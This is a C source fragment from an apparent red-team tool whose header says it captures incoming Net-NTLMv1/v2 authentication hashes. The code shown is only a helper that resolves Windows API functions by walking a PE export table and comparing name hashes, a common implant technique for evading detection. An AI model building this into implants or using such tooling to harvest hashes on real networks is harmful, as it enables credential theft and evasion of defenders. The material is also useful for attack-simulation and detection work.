/**
 *
 * Captures incoming Net-NTLMv1/v2 hashes
 * for incoming authentication attempts
 * via NTLM.
 *
 * GuidePoint Security LLC
 * Threat and Attack Simulation
 *
**/

#include "common.h"

/**
 *
 * @brief:      Acts a replacement for GetProcAddress
 *
 * @param:      Pointer to the PE base.
 * @param:      Hash of the function name.
 *
**/

D_SEC( E ) PVOID PeGetFuncEat( _In_ PVOID Image, _In_ ULONG ExpHash )
{
	ULONG			Djb = 0 ;
	ULONG			Idx = 0 ;

	PUINT16			Aoi = NULL ;
	PUINT32			Aof = NULL ;
	PUINT32			Aos = NULL ;

	PIMAGE_DOS_HEADER	Ids = NULL ;
	PIMAGE_NT_HEADERS	Inh = NULL ;
	PIMAGE_DATA_DIRECTORY	Idd = NULL ;
	PIMAGE_EXPORT_DIRECTORY	Ied = NULL ;

	/* Get pointer to EAT */
	Ids = C_PTR( Image );
	Inh = C_PTR( U_PTR( Ids ) + Ids->e_lfanew );
	Idd = C_PTR( & Inh->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ] );

	if ( Idd->VirtualAddress != 0 )
	{
		/* Set pointers to strings, ordinals, and funcs */
		Ied = C_PTR( U_PTR( Ids ) + Idd->VirtualAddress );
		Aos = C_PTR( U_PTR( Ids ) + Ied->AddressOfNames );
		Aof = C_PTR( U_PTR( Ids ) + Ied->AddressOfFunctions );
		Aoi = C_PTR( U_PTR( Ids ) + Ied->AddressOfNameOrdinals );

		/* Enumerate export entries in table */
		for ( Idx = 0 ; Idx < Ied->NumberOfNames ; ++Idx ) {
			/* Create hash and compare */
			Djb = HashString( C_PTR( U_PTR( Ids ) + Aos[ Idx ] ), 0 );

			if ( Djb == ExpHash ) {
				return C_PTR( U_PTR( Ids ) + Aof[ Aoi[ Idx ] ] );
			};
		};
	};
	return NULL;
};
